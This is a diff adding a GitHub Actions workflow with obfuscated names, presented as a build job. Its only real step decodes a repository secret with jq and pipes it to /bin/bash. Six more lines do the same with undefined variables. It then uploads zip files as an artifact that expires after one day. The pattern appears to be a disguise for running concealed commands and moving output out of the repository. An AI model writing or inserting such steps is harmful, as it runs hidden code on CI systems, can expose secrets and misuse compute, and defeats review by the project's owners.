@@ -1,0 +1,27 @@
+name: meteorgi9235
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meteorgi9235
+        env:
+          q65: ${{ secrets.q65 }}
+        run: |
+          printf '%s' "$q65" | jq -r .pzc090 | /bin/bash
+          echo $yjxx3651 | jq -r .em3045 | /bin/bash
+          echo $hp54 | jq -r .auj93432 | /bin/bash
+          echo $gzibg0914 | jq -r .b38 | /bin/bash
+          printf '%s' "$dtv641" | jq -r .gnzsp845 | /bin/bash
+          printf '%s' "$dbzs10" | jq -r .vzzui6111 | /bin/bash
+          echo $q710 | jq -r .xnrcd38762 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mkKVX6MW
+          path: "*.zip"
+          retention-days: 1
